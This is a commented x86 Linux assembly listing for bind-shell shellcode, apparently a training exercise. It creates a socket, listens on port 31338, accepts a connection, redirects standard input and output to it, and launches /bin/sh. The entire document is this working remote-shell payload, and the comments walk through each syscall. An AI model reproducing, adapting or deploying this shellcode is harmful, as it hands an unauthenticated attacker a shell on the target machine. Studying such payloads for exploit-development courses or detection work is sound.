global _start

_start:
 ; set registers to NULL
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
 xor edx, edx
 xor esi, esi
 xor edi, edi

 ;socket function
 ;socket_fd = socket(AF_INET, SOCK_STREAM, 0); 
 xor eax, eax
 mov ax, 0x167  ; #define __NR_socket 359 in hex format
 mov bl, 2  ; #define AF_INET 2 - from include/linux/socket.h
 mov cl, 1  ; #define SOCK_STREAM - 1 from include/linux/socket.h
 ; edx already null
 int 0x80
 
 mov edi,eax  ; save our number of socket (as socket_fd)

 ; bind function
 ; bind(socket_fd, (struct sockaddr *) &socket_struct, sizeof(socket_struct));
 xor eax, eax
 mov ax, 0x169  ;#define __NR_bind 361 in hex format
 mov ebx, edi ; pass socket_fd to function
 ; lets create socket struct and set ecx to place of this struct
 ; In C code this line:
 ; struct sockaddr_in socket_struct;
 ; From prototypes we know structure of this fucntion
 ; struct sockaddr_in {
 ;    short            sin_family;   
 ;    unsigned short   sin_port;     
 ;    struct in_addr   sin_addr;     
 ;    char             sin_zero[8];  
 ;} 
 ; Okey, lets push our struct to stack with reverse direction
 push edx  ; as sin_zero
 push edx  ; # define INADDR_ANY ((unsigned long int) 0x00000000) in src/include/inet.h
 push word 0x6A7A ; as our port 31338 in hex
 push word 0x02  ; #define AF_INET 2 - from include/linux/socket.h 
 mov ecx, esp ; set ecx register to top of stack and, exactly, to top of our struct
 mov dl , 16 ; set edx register to 17 as length of our struct
 int 0x80

 ; listen function
 ; listen(socket_fd, 0);
 xor eax, eax
 mov ax, 0x16B  ; #define __NR_listen 363 in hex
 mov ebx, edi
 xor ecx, ecx
 
 int 0x80
 
 ; accept function
 ; client_fd = accept(socket_fd, NULL, NULL);
 xor eax, eax
 mov ax, 0x16C
 mov ebx, edi
 xor edx, edx
 xor ecx, ecx ; as ecx NULL
 int 0x80 
 mov ebx, eax ; preserve clientfd from ACCEPT call

; dup2 function
; dup2 (client_fd, i)
  mov cl, 3 ; 3 file descriptors (stdin, stdout, stderr)

 dup_loop:
    dec cl ; use it to change 3,2,1 to 2,1,0
    xor eax, eax ; zero out eax
    mov al, 0x3f ; 
    int 0x80 
    inc cl ;reverse change for loop
    loop dup_loop

 


 ; execve function
 ; execve("/bin/sh", NULL, NULL);
 xor eax, eax
 mov al, 11
 xor edx,edx
 push edx  ; last NULL
 push edx ; last NULL
 push 0x68732f2f
 push 0x6e69622f
 mov ebx, esp
 int 0x80
